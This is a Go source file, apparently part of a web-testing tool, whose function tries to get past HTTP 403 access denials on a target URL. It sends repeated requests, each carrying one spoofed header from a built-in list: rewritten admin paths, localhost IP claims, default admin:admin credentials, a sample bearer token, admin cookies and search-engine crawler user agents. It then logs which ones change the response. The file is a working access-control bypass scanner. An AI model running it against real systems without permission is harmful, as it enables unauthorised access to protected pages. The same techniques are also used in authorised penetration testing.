package bypass

import (
	"net/http"
	"net/url"
)

// TestHeaderManipulation tests different HTTP headers to bypass 403 responses
func TestHeaderManipulation(baseURL string, client *http.Client, config Config) ([]Result, error) {
	var results []Result

	headerManipulations := []struct {
		Header string
		Value  string
	}{
		{"X-Original-URL", "/"},
		{"X-Rewrite-URL", "/"},
		{"X-Override-URL", "/"},
		{"X-Custom-IP-Authorization", "127.0.0.1"},
		{"Referer", baseURL},
		{"X-Originating-IP", "127.0.0.1"},
		{"Authorization", "Basic YWRtaW46YWRtaW4="},
		{"Content-Length", "0"},
		{"X-Original-URL", "/admin"},
		{"X-Rewrite-URL", "/admin"},
		{"X-Auth-Token", "admin"},
		{"X-Forwarded-By", "127.0.0.1"},
		{"X-Forwarded-For-Original", "127.0.0.1"},
		{"X-Forwarded-Host-Original", "localhost"},
		{"X-Pwnage", "127.0.0.1"},
		{"X-Bypass", "127.0.0.1"},
		{"User-Agent", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
		{"User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
		{"User-Agent", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
		{"Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"},
		{"Content-Type", "application/x-www-form-urlencoded"},
		{"Content-Type", "application/json"},
		{"Accept", "*/*"},
		{"Accept-Language", "en-US,en;q=0.9"},
		{"Cookie", "auth=admin; role=administrator"},
		{"X-Api-Version", "2"},
		{"X-CSRF-Token", ""},
		{"X-API-Key", ""},
	}

	// Extract path from URL
	parsedURL, err := url.Parse(baseURL)
	if err != nil {
		return results, err
	}
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	for _, headerM := range headerManipulations {
		req, err := http.NewRequest("GET", baseURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", config.UserAgent)
		req.Header.Set(headerM.Header, headerM.Value)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()

		results = append(results, Result{
			URL:        baseURL,
			StatusCode: resp.StatusCode,
			Method:     "GET",
			Technique:  "Header: " + headerM.Header,
		})
	}

	return results, nil
}
